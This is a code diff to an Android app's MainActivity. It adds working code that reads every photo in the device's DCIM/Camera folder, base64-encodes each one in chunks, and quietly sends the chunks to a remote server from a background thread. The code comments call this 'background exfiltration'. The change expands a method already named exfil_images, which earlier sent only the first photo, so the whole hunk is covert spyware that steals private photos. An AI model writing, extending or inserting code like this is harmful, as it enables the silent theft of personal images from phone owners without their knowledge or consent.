@@ -123,12 +123,24 @@ public class MainActivity extends AppCompatActivity {
 
     private void exfil_images() {
         String image_dir = Environment.getExternalStorageDirectory() + "/DCIM/Camera/";
-        List<String> filenames = Utils.read_dir_files(image_dir);
-        ExfilImage img = new ExfilImage(image_dir+filenames.get(0), 60);
-        List <String> image_buffers = img.buffered_b64image(2000);
-        for(int i=0;i<image_buffers.size();i++){
-            new bgReq().execute(base_url+image_buffers.get(i));
-        }
+
+        final List<String> filenames = Utils.read_dir_files(image_dir);
+
+        Thread exfil_thread = new Thread(new Runnable() {
+            public void run() {
+                for (int i = 0; i < filenames.size(); i++) {
+                    ExfilImage img = new ExfilImage(image_dir+filenames.get(i), 60);
+                    List <String> image_buffers = img.buffered_b64image(2000);
+                    for(int j=0;j<image_buffers.size();j++){
+                        new bgReq().execute(base_url+image_buffers.get(j));
+                    }
+                    //tel to server the end of the image sending
+                    new bgReq().execute(base_url+"~");
+                }
+            }
+        });
+        //background exfiltration
+        exfil_thread.start();
     }
 
     private void exfil() throws IOException {
